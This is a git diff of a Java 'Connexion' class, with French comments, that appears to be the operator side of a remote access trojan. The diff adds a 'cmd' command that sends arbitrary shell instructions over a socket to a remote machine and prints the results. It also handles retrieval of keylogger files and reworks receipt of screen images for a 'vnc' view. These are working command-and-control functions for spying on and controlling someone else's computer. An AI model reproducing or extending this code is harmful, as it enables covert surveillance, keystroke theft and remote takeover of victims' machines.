@@ -13,6 +13,7 @@ import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
+import java.nio.ByteBuffer;
 import java.rmi.RemoteException;
 import java.util.Scanner;
 import java.util.Timer;
@@ -81,14 +82,18 @@ public class Connexion {
 						commande = commande.trim();
 						if (commande.equals("notif")) {
 							out.writeObject(Constante.code_notif);
-						} else if (commande.equals("cmd")) {
-
 						} else if (commande.equals("vnc")) {
 							affichage = new Affichage(); // Cree un nouvel
 															// affichage
 
-						} else if (commande.equals("email")) {
-
+						} else if (commande.equals("cmd")) {
+							String instruction_a_executer=sc.nextLine();
+							instruction_a_executer=instruction_a_executer.trim();
+							out.writeObject(Constante.code_cmd);
+							out.flush();
+							System.out.println("Envoi d'une requete");
+							out.writeObject(instruction_a_executer);
+							out.flush();
 						} else if (commande.equals("quitter")) { // Quitter
 							in.close();
 							out.close();
@@ -96,7 +101,7 @@ public class Connexion {
 						} else if (commande.equals("keylog")) {
 							// Recuperer un fichier de Keylog
 							Server.log.enregistrerFichier(commande);
-							out.writeObject(commande);
+							out.writeObject(Constante.code_keylog);
 							out.flush();
 						} else {
 							Server.log
@@ -125,7 +130,13 @@ public class Connexion {
 										.enregistrerFichier("Recoit une image");
 								affichage.setIcon();
 							}
-							
+							else if(code.equals(Constante.code_cmd)){
+								Object object=(Object) in.readObject();
+								if(object instanceof String){
+									String res=(String) object;
+									System.out.println(res);
+								}
+							}
 							else {
 								Server.log
 										.enregistrerFichier("Recoit un fichier");
@@ -133,6 +144,7 @@ public class Connexion {
 										(Integer) action, in);
 							}
 						}
+						
 
 						else {
 							Server.log
@@ -233,7 +245,7 @@ public class Connexion {
 				public void run() {
 					while (true) {
 						try {
-							RemoteActions ra = remoteActionsQueue.poll(5000,
+							RemoteActions ra = remoteActionsQueue.poll(1000,
 									TimeUnit.MILLISECONDS);
 							out.writeObject(ra);
 							out.flush();
@@ -264,10 +276,13 @@ public class Connexion {
 
 		public void setIcon() throws ClassNotFoundException, IOException {
 			// TODO Auto-generated method stub
-			byte[] image_buffer = (byte[]) in.readObject();
-			ByteArrayInputStream bais = new ByteArrayInputStream(image_buffer);
+			byte[] sizeIm =new byte[4]; 
+			in.read(sizeIm);
+			int size=ByteBuffer.wrap(sizeIm).asIntBuffer().get();
+			byte[] imageIm=new byte[size];
+			in.read(imageIm);
 			final BufferedImage image = ImageIO.read(new ByteArrayInputStream(
-					image_buffer));
+					imageIm));
 			SwingUtilities.invokeLater(new Runnable() {
 
 				@Override
